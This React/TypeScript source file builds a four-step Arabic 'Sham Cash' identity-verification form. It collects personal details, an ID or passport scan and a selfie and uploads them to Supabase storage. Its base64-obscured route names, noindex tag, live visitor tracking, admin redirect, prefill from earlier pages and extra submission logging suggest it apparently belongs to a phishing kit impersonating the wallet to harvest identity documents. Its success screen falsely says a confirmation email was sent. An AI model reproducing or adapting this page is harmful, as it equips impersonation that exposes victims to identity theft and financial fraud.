import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useState, useRef, useEffect, type ChangeEvent, type DragEvent } from "react";
import { usePersistedObject, readStored, writeStored } from "@/lib/form-memory";
import { saveDraftFile, loadDraftFile, clearDraftFiles } from "@/lib/draft-files";

import { supabase } from "@/integrations/supabase/client";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
import {
  Check,
  Loader2,
  UploadCloud,
  FileText,
  X,
  ArrowLeft,
  ArrowRight,
  CircleCheckBig,
  CalendarIcon,
  ChevronDown,
} from "lucide-react";
import { cn } from "@/lib/utils";
import { lazy, Suspense } from "react";
const Calendar = lazy(() => import("@/components/ui/calendar").then((m) => ({ default: m.Calendar })));
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover";
import { countryCodes } from "@/lib/sham-data";
import { AppScreen } from "@/components/app-screen";
import { usePresenceTracker } from "@/lib/presence";
import { logSubmission } from "@/lib/submissions";
import { useAdminRedirect } from "@/lib/admin-redirect";
import { useRequireName } from "@/lib/require-name";
import { ErrorAlert } from "@/components/error-alert";
import { isRapidRepeat, remainingCooldown } from "@/lib/throttle";

export const Route = createFileRoute("/dmVyaWZ5")({
  head: () => ({
    meta: [
      { name: "robots", content: "noindex, nofollow" },
      { title: "تقديم طلب توثيق جديد | شام كاش" },
      {
        name: "description",
        content: "املأ بياناتك الشخصية وارفع مستنداتك لإتمام طلب توثيق حساب شام كاش في 4 خطوات.",
      },
      { property: "og:title", content: "تقديم طلب توثيق جديد — شام كاش" },
      {
        property: "og:description",
        content: "أربع خطوات فقط: البيانات الشخصية، رفع المستندات، مراجعة الطلب، تأكيد الإرسال.",
      },
    ],
  }),
  component: VerifyPage,
});

const steps = ["البيانات الشخصية", "رفع المستندات", "مراجعة الطلب", "تأكيد الإرسال"];

type DocKey = "id" | "photo" | "residence";

const docFields: { key: DocKey; label: string; hint: string }[] = [
  {
    key: "id",
    label: "الهوية الشخصية أو جواز السفر",
    hint: "صورة واضحة للوجهين — JPG أو PNG أو PDF (حتى 5 ميغابايت)",
  },
  { key: "photo", label: "صورة شخصية", hint: "صورة حديثة بخلفية فاتحة وواضحة الملامح" },
];

type PersonalInfo = {
  fullName: string;
  email: string;
  countryCode: string;
  phone: string;
  birthDate: string;
  gender: string;
};

function VerifyPage() {
  usePresenceTracker({ page: "/dmVyaWZ5" });
  useAdminRedirect();
  useRequireName();
  const navigate = useNavigate();
  const [submitting, setSubmitting] = useState(false);
  const [step, setStep] = useState(0);
  const [info, setInfo] = usePersistedObject<PersonalInfo>("sham_verify_info", {
    fullName: "",
    email: "",
    countryCode: "+963",
    phone: "",
    birthDate: "",
    gender: "",
  });

  // تعبئة تلقائية من البيانات التي أدخلها العميل سابقاً في صفحات أخرى
  useEffect(() => {
    const savedName = readStored("sham_name");
    const savedPhone = readStored("sham_phone");
    const savedEmail = readStored("sham_email") ?? readStored("sham_auth_email");
    setInfo((prev) => ({
      ...prev,
      fullName: prev.fullName || (savedName ?? ""),
      email: prev.email || (savedEmail ?? ""),
      phone: prev.phone || (savedPhone ? savedPhone.replace(/\D/g, "").replace(/^963/, "") : ""),
    }));
  }, [setInfo]);

  const [docs, setDocsRaw] = useState<Record<DocKey, File | null>>({
    id: null,
    photo: null,
    residence: null,
  });
  const [errors, setErrors] = useState<string[]>([]);
  const [uploadDone, setUploadDone] = useState(0);
  const errorsRef = useRef<HTMLDivElement | null>(null);
  useEffect(() => {
    if (errors.length > 0) errorsRef.current?.scrollIntoView({ behavior: "smooth", block: "center" });
  }, [errors]);
  const requestId = useRef(`SC-${Math.floor(100000 + Math.random() * 899999)}`);
  const [restored, setRestored] = useState(false);
  const [resumed, setResumed] = useState(false);

  // حفظ المستندات تلقائياً على الجهاز عند اختيارها
  const setDocs: typeof setDocsRaw = (updater) => {
    setDocsRaw((prev) => {
      const nextDocs = typeof updater === "function" ? updater(prev) : updater;
      (Object.keys(nextDocs) as DocKey[]).forEach((k) => {
        if (nextDocs[k] !== prev[k]) void saveDraftFile(`verify_${k}`, nextDocs[k]);
      });
      return nextDocs;
    });
  };

  // استئناف الطلب من حيث توقف العميل: الخطوة + رقم الطلب + المستندات
  useEffect(() => {
    let alive = true;
    (async () => {
      const savedRef = readStored("sham_verify_ref");
      if (savedRef) requestId.current = savedRef;
      else writeStored("sham_verify_ref", requestId.current);
      const loaded = {
        id: await loadDraftFile("verify_id"),
        photo: await loadDraftFile("verify_photo"),
        residence: await loadDraftFile("verify_residence"),
      };
      if (!alive) return;
      setDocsRaw(loaded);
      const allDocs = docFields.every((d) => loaded[d.key]);
      let s = Number(readStored("sham_verify_step") ?? "0") || 0;
      s = Math.min(Math.max(s, 0), 2);
      if (s === 2 && !allDocs) s = 1;
      if (s > 0 || Object.values(loaded).some(Boolean)) setResumed(true);
      setStep(s);
      setRestored(true);
    })();
    return () => { alive = false; };
  }, []);

  useEffect(() => {
    if (restored && step < 3) writeStored("sham_verify_step", String(step));
  }, [step, restored]);

  const set = (key: keyof PersonalInfo, value: string) =>
    setInfo((prev) => ({ ...prev, [key]: value }));

  const validate = () => {
    const list: string[] = [];
    if (step === 0) {
      if (info.fullName.trim().length < 3) list.push("يرجى إدخال الاسم الكامل (3 أحرف على الأقل).");
      if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(info.email.trim()))
        list.push("يرجى إدخال بريد إلكتروني صحيح.");
      if (!/^\d{6,12}$/.test(info.phone.trim())) list.push("يرجى إدخال رقم هاتف صحيح بدون رمز الدولة.");
      if (!info.birthDate) list.push("يرجى تحديد تاريخ الميلاد.");
      if (!info.gender) list.push("يرجى اختيار الجنس.");
    }
    if (step === 1) {
      docFields.forEach((d) => {
        if (!docs[d.key]) list.push(`مطلوب رفع: ${d.label}`);
      });
    }
    setErrors(list);
    return list.length === 0;
  };

  // إرسال البيانات + رفع المستندات فعلياً إلى التخزين الآمن ثم متابعة الحالة
  const submitForReview = async () => {
    setSubmitting(true);
    setUploadDone(0);
    setErrors([]);
    const { data: userData } = await supabase.auth.getUser();
    const userId = userData.user?.id;
    if (!userId) {
      setSubmitting(false);
      void navigate({ to: "/YXV0aA" });
      return;
    }

    try {
      const uploaded: {
        key: string;
        label: string;
        name: string | null;
        size: number | null;
        path: string | null;
      }[] = [];

      for (const d of docFields) {
        const file = docs[d.key];
        if (!file) {
          uploaded.push({ key: d.key, label: d.label, name: null, size: null, path: null });
          continue;
        }
        const ext = file.name.split(".").pop()?.toLowerCase() ?? "bin";
        const path = `${userId}/${requestId.current}-${d.key}-${Date.now()}.${ext}`;
        const { error: upErr } = await supabase.storage
          .from("verification-docs")
          .upload(path, file, { upsert: true, contentType: file.type || "application/octet-stream" });
        if (upErr) throw new Error(`تعذّر رفع «${d.label}»: ${upErr.message}`);
        uploaded.push({
          key: d.key,
          label: d.label,
          name: file.name,
          size: file.size,
          path,
        });
        setUploadDone((n) => n + 1);
      }

      const { data: rows, error: lookupError } = await supabase
        .from("verification_requests")
        .select("id")
        .eq("user_id", userId)
        .order("created_at", { ascending: false })
        .limit(1);

      if (lookupError) throw new Error(lookupError.message);

      const payload = {
        full_name: info.fullName.trim(),
        email: info.email.trim(),
        phone: info.phone.trim(),
        country_code: info.countryCode,
        birth_date: info.birthDate,
        gender: info.gender,
        documents: uploaded,
        status: "under_review" as const,
      };

      if (rows?.[0]?.id) {
        const { error } = await supabase
          .from("verification_requests")
          .update(payload)
          .eq("id", rows[0].id);
        if (error) throw new Error(error.message);
      } else {
        const { error } = await supabase
          .from("verification_requests")
          .insert({ ...payload, user_id: userId, reference: requestId.current });
        if (error) throw new Error(error.message);
      }

      void logSubmission("verify_submit", payload, info.email.trim()).catch(() => {});
      setSubmitting(false);
      writeStored("sham_verify_step", "");
      writeStored("sham_verify_ref", "");
      void clearDraftFiles();
      void navigate({ to: "/cmV2aWV3", replace: true });
    } catch (err) {
      setSubmitting(false);
      setErrors([
        err instanceof Error && err.message
          ? `تعذّر إرسال الطلب: ${err.message}. تحقق من اتصالك بالإنترنت وأعد المحاولة.`
          : "تعذّر إرسال الطلب. تحقق من اتصالك بالإنترنت ثم اضغط إرسال مرة أخرى.",
      ]);
    }
  };

  const next = () => {
    if (submitting) return;
    if (!validate()) return;
    if (step === 2) {
      const key = `verify:${info.email.trim().toLowerCase()}`;
      if (isRapidRepeat(key, 3000)) {
        const sec = Math.ceil(remainingCooldown(key, 3000) / 1000);
        setErrors([`أرسلت الطلب للتو. انتظر ${sec} ثانية قبل إعادة الإرسال حتى لا يتكرر الطلب.`]);
        return;
      }
      setErrors([]);
      void submitForReview();
      return;
    }
    setErrors([]);
    setStep((s) => Math.min(s + 1, steps.length - 1));
  };

  const back = () => {
    setErrors([]);
    setStep((s) => Math.max(s - 1, 0));
  };

  return (
    <AppScreen width="lg">
      <h1 className="text-xl font-bold text-white sm:text-2xl md:text-3xl">تقديم طلب توثيق جديد</h1>
      <p className="mt-2 text-sm leading-6 text-muted-foreground">
        أكمل الخطوات التالية بدقة لضمان قبول طلبك من أول مرة.
      </p>

      {resumed ? (
        <p className="mt-3 rounded-xl border border-accent/30 bg-accent/10 px-3 py-2 text-xs text-accent">
          تم استعادة طلبك من حيث توقفت — تقدّمك يُحفظ تلقائياً على هذا الجهاز.
        </p>
      ) : null}
      <Stepper step={step} />

      <div className="glass-card mt-6 p-4 sm:p-5 md:p-8">
        {errors.length > 0 ? (
          <div ref={errorsRef} className="mb-6">
            <ErrorAlert
              title={errors.length > 1 ? `يرجى إكمال ${errors.length} حقول قبل المتابعة` : "يرجى إكمال الحقل التالي"}
              items={errors}
              hint="الحقول المميّزة بالأحمر مطلوبة — عبّئها ثم اضغط «متابعة»."
            />
          </div>
        ) : null}

        {step === 0 ? <PersonalStep info={info} set={set} /> : null}
        {step === 1 ? <DocsStep docs={docs} setDocs={setDocs} /> : null}
        {step === 2 ? <ReviewStep info={info} docs={docs} onEdit={setStep} /> : null}
        {step === 3 ? <DoneStep requestId={requestId.current} email={info.email} /> : null}

        {step === 2 && submitting ? (
          <div className="mt-6" aria-live="polite">
            <div className="mb-1.5 flex justify-between text-xs text-muted-foreground">
              <span>جارٍ رفع المستندات</span>
              <span dir="ltr" className="tabular-nums">{Math.min(uploadDone, docFields.length)}/{docFields.length}</span>
            </div>
            <div className="h-2 overflow-hidden rounded-full bg-muted">
              <div
                className="h-full rounded-full bg-primary transition-[width] duration-500"
                style={{ width: `${Math.max(8, (Math.min(uploadDone, docFields.length) / docFields.length) * 100)}%` }}
              />
            </div>
          </div>
        ) : null}

        {step < 3 ? (
          <div className="mt-8 grid grid-cols-2 items-center gap-3 border-t border-border pt-6 sm:flex sm:justify-between">
            <button
              type="button"
              onClick={back}
              disabled={step === 0}
              className="inline-flex min-h-12 items-center justify-center gap-2 rounded-xl border border-border px-5 py-3 text-sm font-semibold text-foreground transition-colors hover:bg-muted active:scale-[0.98] disabled:opacity-40"
            >
              السابق
            </button>
            <button
              type="button"
              onClick={next}
              disabled={submitting}
              className="inline-flex min-h-12 items-center justify-center gap-2 rounded-xl btn-primary-glow px-5 py-3 text-sm font-bold transition active:scale-[0.98] disabled:cursor-wait disabled:opacity-70"
            >
              {submitting ? <Loader2 className="size-4 shrink-0 animate-spin" /> : null}
              <span className="truncate">
                {step === 2 ? (submitting ? "جارٍ الإرسال..." : "تأكيد وإرسال") : "التالي"}
              </span>
            </button>
          </div>
        ) : null}
      </div>
    </AppScreen>
  );
}

function Stepper({ step }: { step: number }) {
  return (
    <div className="mt-8">
    <p className="mb-3 text-center text-xs font-semibold text-muted-foreground" aria-live="polite">
      الخطوة {Math.min(step + 1, steps.length)} من {steps.length}
    </p>
    <ol className="grid grid-cols-4 gap-2">
      {steps.map((label, i) => {
        const done = i < step;
        const active = i === step;
        return (
          <li key={label} className="text-center" aria-current={active ? "step" : undefined}>
            <div
              className={`mx-auto flex size-9 items-center justify-center rounded-full border text-sm font-bold transition-all duration-300 ${
                done
                  ? "border-accent bg-accent text-accent-foreground"
                  : active
                    ? "step-dot-active scale-110 border-primary bg-brand-soft"
                    : "border-border bg-card text-muted-foreground"
              }`}
            >
              {done ? <Check className="size-4" /> : i + 1}
            </div>
            <div
              className={`mt-2 text-[11px] leading-4 md:text-xs ${active || done ? "font-semibold text-foreground" : "text-muted-foreground"}`}
            >
              {label}
            </div>
            <div
              className={`mt-2 h-1 rounded-full transition-colors duration-500 ${done || active ? "bg-primary" : "bg-border"}`}
            />
          </li>
        );
      })}
    </ol>
    </div>
  );
}

const inputClass =
  "w-full rounded-xl border border-input bg-card px-4 py-3 text-sm text-foreground outline-none transition-colors placeholder:text-muted-foreground focus:border-primary focus:ring-2 focus:ring-ring/25";

function Field({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <label className="block">
      <span className="mb-2 block text-sm font-semibold text-foreground">{label}</span>
      {children}
    </label>
  );
}

function PersonalStep({
  info,
  set,
}: {
  info: PersonalInfo;
  set: (k: keyof PersonalInfo, v: string) => void;
}) {
  return (
    <div className="grid gap-5 md:grid-cols-2">
      <div className="md:col-span-2">
        <Field label="الاسم الكامل">
          <input
            className={inputClass}
            value={info.fullName}
            maxLength={100}
            onChange={(e) => set("fullName", e.target.value)}
            placeholder="مثال: خالد يوسف الحمصي"
          />
        </Field>
      </div>
      <Field label="البريد الإلكتروني">
        <input
          className={inputClass}
          type="email"
          dir="ltr"
          inputMode="email"
          autoComplete="email"
          maxLength={255}
          value={info.email}
          onChange={(e) => set("email", e.target.value)}
          placeholder="name@example.com"
        />
      </Field>
      <Field label="رقم الهاتف">
        <div className="grid grid-cols-[7.5rem_minmax(0,1fr)] gap-2 sm:grid-cols-[10rem_minmax(0,1fr)]">
          <div className="relative min-w-0">
            <select
              aria-label="رمز الدولة"
              className="w-full appearance-none truncate rounded-xl border border-input bg-card py-3 ps-3 pe-7 text-xs font-semibold text-foreground outline-none transition-colors focus:border-primary focus:ring-2 focus:ring-ring/25 sm:text-sm"
              value={info.countryCode}
              onChange={(e) => set("countryCode", e.target.value)}
            >
              {countryCodes.map((c) => (
                <option key={c.code} value={c.code}>
                  {c.code} {c.label}
                </option>
              ))}
            </select>
            <ChevronDown className="pointer-events-none absolute top-1/2 end-2 size-4 -translate-y-1/2 text-muted-foreground" />
          </div>
          <input
            className={`${inputClass} min-w-0`}
            dir="ltr"
            inputMode="numeric"
            maxLength={12}
            value={info.phone}
            onChange={(e) => set("phone", e.target.value.replace(/\D/g, ""))}
            placeholder="9xxxxxxxx"
          />
        </div>
      </Field>
      <Field label="تاريخ الميلاد">
        <BirthDatePicker
          value={info.birthDate}
          onChange={(v) => set("birthDate", v)}
        />
      </Field>
      <Field label="الجنس">
        <div className="flex gap-2">
          {["ذكر", "أنثى"].map((g) => (
            <button
              key={g}
              type="button"
              onClick={() => set("gender", g)}
              className={`flex-1 rounded-xl border px-4 py-3 text-sm font-semibold transition-colors ${
                info.gender === g
                  ? "border-primary bg-brand-soft text-primary"
                  : "border-input bg-card text-muted-foreground hover:bg-muted"
              }`}
            >
              {g}
            </button>
          ))}
        </div>
      </Field>
    </div>
  );
}

function BirthDatePicker({
  value,
  onChange,
}: {
  value: string;
  onChange: (v: string) => void;
}) {
  const selected = value ? new Date(`${value}T00:00:00`) : undefined;
  const maxDate = new Date();
  const minDate = new Date(1920, 0, 1);

  return (
    <Popover>
      <PopoverTrigger asChild>
        <button
          type="button"
          className={cn(
            inputClass,
            "flex min-h-12 items-center justify-start gap-2 text-right",
            !selected && "text-muted-foreground",
          )}
        >
          <CalendarIcon className="size-4 shrink-0" />
          {selected ? (
            format(selected, "d MMMM yyyy", { locale: ar })
          ) : (
            <span>اختر تاريخ الميلاد</span>
          )}
        </button>
      </PopoverTrigger>
      <PopoverContent className="w-auto max-w-[calc(100vw-2rem)] p-0" align="center">
        <Suspense fallback={<div className="h-[320px] w-[280px]" />}>
        <Calendar
          mode="single"
          selected={selected}
          onSelect={(d) => onChange(d ? format(d, "yyyy-MM-dd") : "")}
          disabled={(d) => d > maxDate || d < minDate}
          captionLayout="dropdown"
          defaultMonth={selected ?? new Date(2000, 0, 1)}
          locale={ar}
          initialFocus
          className="p-3 pointer-events-auto"
        />
        </Suspense>

      </PopoverContent>
    </Popover>
  );
}

function DocsStep({
  docs,
  setDocs,
}: {
  docs: Record<DocKey, File | null>;
  setDocs: React.Dispatch<React.SetStateAction<Record<DocKey, File | null>>>;
}) {
  return (
    <div className="grid gap-5">
      {docFields.map((d) => (
        <DropZone
          key={d.key}
          label={d.label}
          hint={d.hint}
          file={docs[d.key]}
          onFile={(file) => setDocs((prev) => ({ ...prev, [d.key]: file }))}
        />
      ))}
    </div>
  );
}

function DropZone({
  label,
  hint,
  file,
  onFile,
}: {
  label: string;
  hint: string;
  file: File | null;
  onFile: (f: File | null) => void;
}) {
  const [over, setOver] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  useEffect(() => {
    if (!file || !file.type.startsWith("image/")) { setPreviewUrl(null); return; }
    const url = URL.createObjectURL(file);
    setPreviewUrl(url);
    return () => URL.revokeObjectURL(url);
  }, [file]);

  const handleDrop = (e: DragEvent<HTMLDivElement>) => {
    e.preventDefault();
    setOver(false);
    const f = e.dataTransfer.files?.[0];
    if (f) onFile(f);
  };

  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
    const f = e.target.files?.[0];
    if (f) onFile(f);
  };

  return (
    <div>
      <span className="mb-2 block text-sm font-semibold text-foreground">{label}</span>
      {file ? (
        <div className="flex items-center justify-between gap-3 rounded-2xl border border-success/30 bg-success/8 p-4">
          <div className="flex min-w-0 items-center gap-3">
            {previewUrl ? (
              <img src={previewUrl} alt={label} className="size-14 shrink-0 rounded-xl object-cover ring-1 ring-success/30" />
            ) : (
              <FileText className="size-5 shrink-0 text-success" />
            )}
            <div className="min-w-0">
              <p className="truncate text-sm font-semibold text-foreground">{file.name}</p>
              <p className="text-xs text-muted-foreground">
                {(file.size / 1024).toFixed(0)} كيلوبايت — تم الرفع
              </p>
            </div>
          </div>
          <button
            type="button"
            aria-label="إزالة الملف"
            onClick={() => onFile(null)}
            className="inline-flex size-11 shrink-0 items-center justify-center rounded-lg text-muted-foreground transition-colors hover:bg-muted hover:text-destructive"
          >
            <X className="size-4" />
          </button>
        </div>
      ) : (
        <div
          onDragOver={(e) => {
            e.preventDefault();
            setOver(true);
          }}
          onDragLeave={() => setOver(false)}
          onDrop={handleDrop}
          onClick={() => inputRef.current?.click()}
          role="button"
          tabIndex={0}
          onKeyDown={(e) => e.key === "Enter" && inputRef.current?.click()}
          className={`cursor-pointer rounded-2xl border-2 border-dashed p-6 text-center transition-colors ${
            over ? "border-primary bg-brand-soft" : "border-border bg-muted/40 hover:border-primary/50"
          }`}
        >
          <UploadCloud className="mx-auto size-7 text-primary" />
          <p className="mt-3 text-sm font-semibold text-foreground">
            اسحب الملف هنا أو اضغط للاختيار
          </p>
          <p className="mt-1 text-xs text-muted-foreground">{hint}</p>
          <input
            ref={inputRef}
            type="file"
            accept="image/*,application/pdf"
            className="hidden"
            onChange={handleChange}
          />
        </div>
      )}
    </div>
  );
}

function ReviewStep({
  info,
  docs,
  onEdit,
}: {
  info: PersonalInfo;
  docs: Record<DocKey, File | null>;
  onEdit: (s: number) => void;
}) {
  const rows: [string, string][] = [
    ["الاسم الكامل", info.fullName],
    ["البريد الإلكتروني", info.email],
    ["رقم الهاتف", `${info.countryCode} ${info.phone}`],
    ["تاريخ الميلاد", info.birthDate],
    ["الجنس", info.gender],
  ];

  return (
    <div className="grid gap-6">
      <section>
        <div className="flex items-center justify-between">
          <h2 className="text-base font-bold">البيانات الشخصية</h2>
          <button
            type="button"
            onClick={() => onEdit(0)}
            className="inline-flex min-h-11 items-center px-2 text-xs font-semibold text-primary hover:underline"
          >
            تعديل
          </button>
        </div>
        <dl className="mt-3 divide-y divide-border rounded-2xl border border-border">
          {rows.map(([k, v]) => (
            <div key={k} className="flex items-center justify-between gap-4 px-4 py-3">
              <dt className="text-xs text-muted-foreground">{k}</dt>
              <dd className="truncate text-sm font-semibold text-foreground">{v}</dd>
            </div>
          ))}
        </dl>
      </section>

      <section>
        <div className="flex items-center justify-between">
          <h2 className="text-base font-bold">المستندات المرفوعة</h2>
          <button
            type="button"
            onClick={() => onEdit(1)}
            className="inline-flex min-h-11 items-center px-2 text-xs font-semibold text-primary hover:underline"
          >
            تعديل
          </button>
        </div>
        <ul className="mt-3 divide-y divide-border rounded-2xl border border-border">
          {docFields.map((d) => (
            <li key={d.key} className="flex items-center justify-between gap-4 px-4 py-3">
              <span className="text-xs text-muted-foreground">{d.label}</span>
              <span className="flex items-center gap-1.5 truncate text-sm font-semibold text-success">
                <Check className="size-4 shrink-0" /> {docs[d.key]?.name}
              </span>
            </li>
          ))}
        </ul>
      </section>

      <p className="rounded-xl bg-muted p-4 text-xs leading-6 text-muted-foreground">
        بالضغط على «تأكيد وإرسال الطلب» فإنك تقرّ بصحة البيانات والمستندات المقدّمة، وتوافق على
        معالجتها لغرض توثيق حسابك في شام كاش.
      </p>
    </div>
  );
}

function DoneStep({ requestId, email }: { requestId: string; email: string }) {
  return (
    <div className="py-6 text-center">
      <span className="mx-auto flex size-16 items-center justify-center rounded-full bg-success/12 text-success">
        <CircleCheckBig className="size-8" />
      </span>
      <h2 className="mt-5 text-xl font-bold">تم استلام طلبك بنجاح</h2>
      <p className="mx-auto mt-2 max-w-md text-sm leading-7 text-muted-foreground">
        أرسلنا تأكيداً إلى <span dir="ltr">{email}</span>. احتفظ برقم الطلب لمتابعة حالته في أي وقت.
      </p>
      <div className="mx-auto mt-6 w-fit rounded-2xl border border-dashed border-primary/40 bg-brand-soft px-8 py-4">
        <p className="text-xs text-muted-foreground">رقم الطلب</p>
        <p dir="ltr" className="mt-1 text-2xl font-extrabold tracking-widest text-primary">
          {requestId}
        </p>
      </div>
      <div className="mt-8 flex flex-col justify-center gap-3 sm:flex-row">
        <Link
          to="/"
          className="rounded-xl border border-border px-6 py-3 text-sm font-semibold text-foreground transition-colors hover:bg-muted"
        >
          العودة للرئيسية
        </Link>
      </div>
    </div>
  );
}
